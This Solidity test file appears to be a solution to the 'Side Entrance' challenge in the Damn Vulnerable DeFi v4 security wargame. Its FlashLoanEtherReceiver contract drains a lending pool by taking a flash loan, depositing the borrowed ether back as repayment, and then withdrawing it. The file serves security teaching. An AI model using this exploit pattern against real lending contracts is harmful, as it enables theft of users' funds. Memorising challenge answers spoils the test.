// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable i_pool;
    address private immutable i_owner;
    address private immutable i_recoveryAddress;

    constructor(address pool, address recovery) {
        i_pool = SideEntranceLenderPool(pool);
        i_owner = msg.sender;
        i_recoveryAddress = recovery;
    }

    function execute() external payable {
        i_pool.deposit{value: msg.value}();
        (bool success,) = address(i_pool).call{value: msg.value}("");
        (success);
    }

    receive() external payable {
        if (msg.sender == i_owner) {
            i_pool.flashLoan(address(i_pool).balance);
            i_pool.withdraw();
        } else {
            (bool success,) = i_recoveryAddress.call{value: msg.value}("");
            (success);
        }
    }
}

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        FlashLoanEtherReceiver receiver = new FlashLoanEtherReceiver(address(pool), recovery);
        (bool success,) = address(receiver).call{value: PLAYER_INITIAL_ETH_BALANCE}("");
        (success);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
